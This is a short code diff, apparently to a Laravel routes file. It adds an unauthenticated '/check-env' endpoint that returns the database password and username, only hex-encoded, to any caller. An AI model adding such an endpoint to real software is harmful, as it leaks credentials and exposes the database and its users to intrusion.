@@ -52,6 +52,13 @@ Route::get('/test-db-connection', function (Request $request) {
         ], 500);
     }
 });
+Route::get('/check-env', function () {
+    return response()->json([
+        'DB_PASSWORD' => bin2hex(env('DB_PASSWORD')),
+        'DB_USERNAME' => bin2hex(env('DB_USERNAME')),
+    ]);
+});
+
 
 
 
